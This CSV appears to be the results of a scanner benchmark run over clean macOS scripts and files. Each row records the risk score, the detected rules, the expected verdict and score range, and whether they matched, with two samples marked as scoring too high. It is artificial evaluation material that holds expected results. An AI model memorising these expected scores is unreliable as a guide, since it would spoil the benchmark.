run_id,sample_id,group,subtype,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,findings
"2026-03-08T10-11-22Z-441932","clean_app_manifest_01","clean","app","clean/app/clean_app_manifest_01.json","unknown","0","clean","clean","0","10","true","true","","completed","449","2026-03-08T10:11:23.100Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","No dedicated analyzer for unknown. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","clean_applescript_notification_01","clean","applescript","clean/applescript/clean_applescript_notification_01.applescript","appleScript","0","clean","clean","0","12","true","true","","completed","179","2026-03-08T10:11:23.280Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_applescript_open_finder_01","clean","applescript","clean/applescript/clean_applescript_open_finder_01.applescript","appleScript","0","clean","clean","0","8","true","true","","completed","184","2026-03-08T10:11:23.465Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L2-2 Δ8: tell application ""Finder"""
"2026-03-08T10-11-22Z-441932","clean_applescript_prompt_01","clean","applescript","clean/applescript/clean_applescript_prompt_01.applescript","appleScript","0","clean","clean","0","6","true","true","","completed","182","2026-03-08T10:11:23.647Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_applescript_textedit_newdoc_01","clean","applescript","clean/applescript/clean_applescript_textedit_newdoc_01.applescript","appleScript","0","clean","clean","0","8","true","true","","completed","183","2026-03-08T10:11:23.830Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_js_base64_demo_01","clean","js","clean/js/clean_js_base64_demo_01.js","javaScript","25","clean","clean","3","15","true","false","score_too_high","completed","178","2026-03-08T10:11:24.009Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(source, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
"2026-03-08T10-11-22Z-441932","clean_js_child_process_echo_01","clean","js","clean/js/clean_js_child_process_echo_01.js","javaScript","10","clean","clean","5","18","true","true","","completed","178","2026-03-08T10:11:24.188Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [javascript.child_process] Node child_process 执行链 [high] L12-12 Δ22: console.log('[clean] child_process output:', stdout.trim()); | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-11-22Z-441932","clean_js_config_merge_01","clean","js","clean/js/clean_js_config_merge_01.js","javaScript","10","clean","clean","0","12","true","true","","completed","179","2026-03-08T10:11:24.367Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_js_read_local_config_02","clean","js","clean/js/clean_js_read_local_config_02.js","javaScript","10","clean","clean","0","8","true","false","score_too_high","completed","173","2026-03-08T10:11:24.540Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_pkg_receipt_stub_01","clean","pkg","clean/pkg/clean_pkg_receipt_stub_01.json","unknown","0","clean","clean","0","10","true","true","","completed","417","2026-03-08T10:11:24.958Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","No dedicated analyzer for unknown. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","clean_plist_launchagent_template_01","clean","plist","clean/plist/clean_plist_launchagent_template_01.plist","plist","0","clean","clean","0","18","true","true","","completed","418","2026-03-08T10:11:25.376Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","No dedicated analyzer for plist. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for plist. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","clean_python_config_rw_02","clean","python","clean/python/clean_python_config_rw_02.py","pythonScript","10","clean","clean","0","12","true","true","","completed","174","2026-03-08T10:11:25.551Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_python_directory_scan_01","clean","python","clean/python/clean_python_directory_scan_01.py","pythonScript","10","clean","clean","0","10","true","true","","completed","176","2026-03-08T10:11:25.727Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_python_log_rotate_01","clean","python","clean/python/clean_python_log_rotate_01.py","pythonScript","10","clean","clean","0","15","true","true","","completed","173","2026-03-08T10:11:25.901Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_python_subprocess_safe_01","clean","python","clean/python/clean_python_subprocess_safe_01.py","pythonScript","10","clean","clean","5","18","true","true","","completed","179","2026-03-08T10:11:26.081Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(cmd, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
